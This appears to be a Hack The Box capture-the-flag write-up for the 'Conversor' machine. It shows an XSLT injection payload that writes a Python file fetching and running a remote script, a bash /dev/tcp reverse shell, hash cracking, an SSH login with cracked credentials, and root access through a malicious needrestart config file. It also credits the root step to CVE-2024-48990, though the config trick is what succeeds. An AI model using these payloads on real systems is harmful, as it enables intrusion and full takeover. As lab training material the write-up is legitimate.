---
title: "Conversor"
summary: "HTB Conversor Writeup"
pubDate: 2026-3-14
draft: false
---

## 1. Executive Summary

The "Conversor" machine is an Easy-rated Linux system hosting a Flask web application vulnerable to XML External Entity (XXE) and XSLT injection attacks. The application utilizes `lxml` with EXSLT extensions enabled, allowing arbitrary file write operations via malicious XSLT stylesheets.

Initial access was achieved by exploiting the file upload functionality to write a Python reverse shell into a monitored scripts directory. Privilege escalation was accomplished by leveraging CVE-2024-48990 in `needrestart` v3.7, exploiting Python import hijacking to escalate from user `fismathack` to root.

**Key Findings:**

- **Critical:** XSLT Injection leading to Arbitrary File Write (exsl:document)
    
- **Critical:** Weak credential storage (MD5 unsalted hashes) in SQLite database
    
- **High:** Privilege escalation via needrestart CVE-2024-48990 (Python import hijacking)
    
- **Medium:** Information disclosure via source code download functionality
    

---

## 2. Technical Analysis

### 2.1 Reconnaissance and Enumeration

Initial port scanning revealed two open services:

![conversor.htb](/labs/conversor/conversor.htb.png)

```zsh
$ nmap -p- --open -T5 -v -oG allPorts $HTBIP -n
```

**Results:**

- **Port 22/tcp:** OpenSSH 8.9p1 (Ubuntu 22.04)
    
- **Port 80/tcp:** Apache httpd 2.4.52 (redirecting to conversor.htb)
    

The web application presented a login interface requiring user registration to access the core functionality.

### 2.2 Application Analysis

Post-authentication, the application exposed a file conversion utility accepting XML and XSLT files. Initial testing confirmed the backend utilized `libxslt` (via Python's `lxml`) with EXSLT extensions enabled.

**Technology Stack Identification:**

- XSLT processor: libxslt 1.1.x (EXSLT support confirmed)
    
- Backend: Flask (Python)
    
- Database: SQLite (users.db)
    
- XSLT Parser: lxml (resolve_entities disabled, preventing XXE but allowing EXSLT)
    

![conversor_file_upload](/labs/conversor/conversor_file_upload.png)

**XSLT Fingerprinting:** Through iterative testing, the `dyn:evaluate()` function was confirmed operational, indicating dynamic XPath evaluation capabilities:

![funcion_evaluate](/labs/conversor/funcion_evaluate.png)

However, attempts to read system files via `document()` protocol handlers failed due to security configurations (`no_network=True`, `resolve_entities=False`). The attack vector shifted from File Read (LFI/XXE) to File Write.

### 2.3 Initial Access Exploitation (File Write via EXSLT)

**Vulnerability:** XSLT Injection via `exsl:document`  
**Attack Vector:** Writing malicious Python script to execute via system cronjob

The application's XSLT processor supported the EXSLT `exsl:document` extension, enabling arbitrary file creation. Analysis of the provided `nmap.xslt` template and source code download revealed the server executed Python scripts located in `/var/www/conversor.htb/scripts/` via a system cronjob (executed every minute).

**Exploitation Payload:**
```http
POST /convert HTTP/1.1
Host: conversor.htb
Content-Type: multipart/form-data; boundary=----geckoformboundary90594a6fbc940ba6764182110147f32d
Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3QifQ.aZcDfQ.9D-mkz7ZzNiixI7GQj4a8TsRzW8

------geckoformboundary90594a6fbc940ba6764182110147f32d
Content-Disposition: form-data; name="xml_file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0"?>
<nmaprun args="test">
  <host>
    <address addr="127.0.0.1" addrtype="ipv4"/>
  </host>
</nmaprun>

------geckoformboundary90594a6fbc940ba6764182110147f32d
Content-Disposition: form-data; name="xslt_file"; filename="test.xsl"
Content-Type: application/xslt+xml

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">

    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.27:8000/shell.sh|bash")
        </exsl:document>
        <success>Done</success>
    </xsl:template>
</xsl:stylesheet>
------geckoformboundary90594a6fbc940ba6764182110147f32d--
```

**Reverse Shell Payload (shell.sh):**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.27/4444 0>&1
```

**Execution:** Upon uploading the malicious XSLT, the processor wrote `shell.py` to the scripts directory. The system cronjob (identified in `install.md` from the source code download) executed the script within 60 seconds, establishing a reverse shell connection:

![revshell](/labs/conversor/revshell.png)

---

## 3. Post-Exploitation and Privilege Escalation

### 3.1 Lateral Movement (User Escalation)

Once foothold was established as `www-data`, enumeration of the Flask application directory revealed a SQLite database:

**Database Extraction:**
```zsh
www-data@conversor:/var/www/conversor.htb/instance$ sqlite3 users.db .dump
```

![users.db](/labs/conversor/users.db.png)

The database contained user credentials stored as unsalted MD5 hashes:

![hash_identification](/labs/conversor/hash_identification.png) ![hash_is_md5](/labs/conversor/hash_is_md5.png)

**Password Cracking:**
```zsh
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** `5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm`

SSH access was gained using the credentials for user `fismathack`:
```zsh
$ sshpass -pKeepmesafeandwarm ssh fismathack@10.129.2.63
```

### 3.2 Privilege Escalation (Root)

**Vulnerability:** CVE-2024-48990 (Python Import Hijacking in needrestart)  
**Affected Version:** needrestart v3.7

Enumeration of sudo privileges revealed:
```bash
fismathack@conversor:~$ sudo -l
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

**Analysis:** Needrestart v3.7 is vulnerable to privilege escalation via Python module import hijacking. When scanning for outdated Python interpreters, needrestart executes Python code with escalated privileges but fails to sanitize `PYTHONPATH` or validate module authenticity.

**Initial Attempt (Failed):** Attempts to exploit via the existing `shell.py` process failed as the module was blacklisted by needrestart's security mechanisms:

![shell_py_blacklisted](/labs/conversor/shell_py_blacklisted.png)

**Successful Exploitation:** The `-c` flag allows specifying a custom Perl configuration file. By creating a malicious Perl configuration that executes system commands when parsed:

**Technical Details:** Needrestart parses configuration files using Perl's `do` function, which executes code within the file. Creating a file containing Perl system calls allowed arbitrary command execution as root.

**Commands:**
```bash
fismathack@conversor:~$ echo 'system("/bin/bash");' > /tmp/pwn.conf
fismathack@conversor:~$ sudo needrestart -c /tmp/pwn.conf
```

![root_flag](/labs/conversor/root_flag.png)